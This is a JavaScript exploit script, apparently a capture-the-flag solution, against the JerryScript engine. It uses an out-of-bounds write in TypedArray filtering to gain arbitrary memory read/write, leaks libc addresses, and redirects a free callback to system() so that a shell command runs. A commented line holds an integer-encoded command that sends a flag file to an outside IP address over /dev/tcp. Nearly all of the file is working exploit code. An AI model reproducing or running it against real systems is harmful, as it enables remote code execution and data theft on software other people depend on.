Number.prototype.hex = function() {
	return "0x" + this.toString(16);
}
BigInt.prototype.hex = function() {
	return "0x" + this.toString(16);
}

// Typedarray with external pointer in jerryscript
// There is flag in header of heap chunk ( at chunk + 0xb ) and we can switch its buffer to external pointer.
//   ( You can't call this from js normally. )
// We can overwrite this flag to 1 and unlock external pointer with callback when free it.
//

// Memory Layout
//
// [ jerry_global_heap ]
// -------
// ...
// -------
// array_0 <-- filtered chunk ( with oob memcpy ) will place here
// -------
// array_1 <-- ovrwrite length of this array 
// -------
// array_2 <-- AAR/W array
// -------
// ...
// for_leaks <-- drop heap leak after gc()
// ...
// -------
//

var array_0 = new Uint8Array(0x300);
var array_1 = new Uint32Array(0x100);
var array_2 = new Uint32Array(0x100);
var for_leaks = [];
for (let i = 0; i < 0x2000; i++) for_leaks.push({"A": 1});

// place os command
// bash -c "/readflag > /dev/tcp/18.218.8.16/44444
//var sc = [1752392034, 543370528, 1701981986, 1818649697, 1042311009, 1701064480, 1668558710, 942747504, 942748206, 825112622, 875835190, 573846580];

// /bin/whoami
var sc = [1852400175, 1869117231, 6909281];

// create oob payload
var leng = 0xc0;
for (let i = 0; i < leng; i++) array_2[i] = 0xfff;
array_2[leng] = 0x21;
array_2[leng+1] = 0;
array_2[leng+2] = 0x117;
array_2[leng+3] = 0x313370 >> 2;

array_2.constructor = Uint8Array;
array_0 = 0; // this will wipe array_0 reference and after gc(), we can reclaim this area again.
for_leaks = 0;
gc();

// trigger bug to overwrite
array_2.filter(x => true);
print("corrupted length:", array_1.length.hex());

// get heap leak
var leak_lo = 0;
var leak_hi = 0;
for (let i = 1; i < 0x1000; i++ ){
	if (array_1[i] < 0x6000 && array_1[i] > 0x5000 && array_1[i-1] != 0) {
		leak_lo = array_1[i-1];
		leak_hi = array_1[i];
		break;
	}
}
var leak = (BigInt(leak_hi) << 32n) + BigInt(leak_lo);

// now we have valid address. turn the flag to 1 and get AAR primitive. 
array_1[0x102] = 0x10117;
function aar32(addr) {
	array_1[0x104] = Number(addr & 0xffffffffn);
	array_1[0x105] = Number(addr >> 32n);
	return array_2[0];
}
function aar(addr) {
	return BigInt(aar32(addr)) + (BigInt(aar32(addr+4n)) << 32n);
}
function aaw32(addr, value) {
	array_1[0x104] = Number(addr & 0xffffffffn);
	array_1[0x105] = Number(addr >> 32n);
	array_2[0] = value.i2f();
}

// get heap, pie, libc offset 
var target = leak - 0x3000n;
var heap_base = 0n;
for (let i = 0; i < 0x1000; i++ ){
	if (aar32(target + BigInt(i) * 8n) < 0x1000) {
		if ((aar32(target + BigInt(i) * 8n + 8n) & 0xffff) == 0x70) {
			heap_base = target + BigInt(i) * 8n;
			break;
		}
	}
}
if ( heap_base == 0n ) {
	print("heap_base not found. check offset.");
	while(1) {}
}
print("heap_base:", heap_base.hex());

var ptr_jerryx_handler_assert = heap_base + 0x148n;
var jerryx_handler_assert = aar(ptr_jerryx_handler_assert);
var pie = jerryx_handler_assert - 0x4eb93n;
var ptr_got_free = pie + 0x68eb8n;
var got_free = aar(ptr_got_free);
var libc_base = got_free - 0xa5460n;
var system = libc_base + 0x50d60n;
print("libc_base:", libc_base.hex());

// get addr of array_1 to locate our command addr
// mark for search
array_1[0] = 0x11221122;
array_1[1] = 0x33443344;

// you can use aaw here, but this way is more stable.
for (let i = 0; i < sc.length; i++ ){
	array_1[i+2] = sc[i];
}
var addr_array_1 = 0;
for (let i = 0; i < 0x1000; i++ ){
	if (aar32(heap_base + BigInt(i) * 8n) == 0x11221122) {
		if (aar32(heap_base + BigInt(i) * 8n + 4n) == 0x33443344) {
			addr_array_1 = heap_base + BigInt(i) * 8n;
			break;
		}
	}
}
if ( addr_array_1 == 0n ) {
	print("array_1 not found. check offset.");
	while(1) {}
}
print("array_1:", addr_array_1.hex());

// change array_2 external pointer to our command
array_1[0x104] = Number((addr_array_1 + 8n) & 0xffffffffn);
array_1[0x105] = Number((addr_array_1 + 8n) >> 32n);

// change array_2 free_cb to system
array_1[0x106] = Number(system & 0xffffffffn);
array_1[0x107] = Number(system >> 32n);

// wipe array_2 reference
array_2 = 0;

// trigger array_2 free_cb
gc();

// we need this to prevent any other destructor call
while(1) {}

